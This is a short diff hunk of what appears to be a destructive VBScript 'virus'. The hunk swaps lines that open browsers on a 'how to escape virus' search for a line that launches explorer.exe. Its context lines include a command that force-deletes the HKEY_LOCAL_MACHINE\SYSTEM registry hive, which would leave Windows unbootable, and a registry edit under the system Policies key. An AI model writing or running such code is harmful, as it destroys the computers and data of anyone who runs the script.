@@ -37,9 +37,7 @@ shell.run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Syste
 
 shell.run "reg delete HKEY_LOCAL_MACHINE\SYSTEM /f", 0, True
 
-shell.run "chrome https://www.google.com/search?q=how+to+escape+virus", 0, True
-
-shell.run "msedge https://www.google.com/search?q=how+to+escape+virus", 0, True
+shell.run "explorer.exe"
 
 Else
       WScript.Quit
